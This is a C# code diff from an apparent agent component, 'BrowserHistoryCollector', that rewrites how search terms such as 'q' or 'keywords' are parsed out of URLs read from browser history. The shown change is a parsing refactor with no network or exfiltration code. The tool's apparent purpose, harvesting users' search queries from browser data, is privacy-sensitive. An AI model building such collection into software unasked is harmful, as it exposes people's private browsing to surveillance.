@@ -1,6 +1,5 @@
 using Microsoft.Data.Sqlite;
 using System.Globalization;
-using System.Web;
 
 namespace Vorken.Agent;
 
@@ -382,15 +381,32 @@ internal static class BrowserHistoryCollector
             if (!Uri.TryCreate(url, UriKind.Absolute, out Uri? uri))
                 return "";
 
-            var query = HttpUtility.ParseQueryString(uri.Query);
+            var wanted = new HashSet<string>(
+                new[]
+                {
+                    "q", "query", "search", "search_query",
+                    "text", "p", "keyword", "keywords"
+                },
+                StringComparer.OrdinalIgnoreCase);
 
-            foreach (string key in new[]
-                     {
-                         "q", "query", "search", "search_query",
-                         "text", "p", "keyword", "keywords"
-                     })
+            string query = uri.Query.TrimStart('?');
+
+            foreach (string part in query.Split(
+                         '&',
+                         StringSplitOptions.RemoveEmptyEntries))
             {
-                string? value = query[key];
+                string[] pieces = part.Split('=', 2);
+                if (pieces.Length == 0)
+                    continue;
+
+                string key = Uri.UnescapeDataString(pieces[0].Replace('+', ' '));
+                if (!wanted.Contains(key))
+                    continue;
+
+                string value = pieces.Length > 1
+                    ? Uri.UnescapeDataString(pieces[1].Replace('+', ' '))
+                    : "";
+
                 if (!string.IsNullOrWhiteSpace(value))
                     return value.Trim();
             }
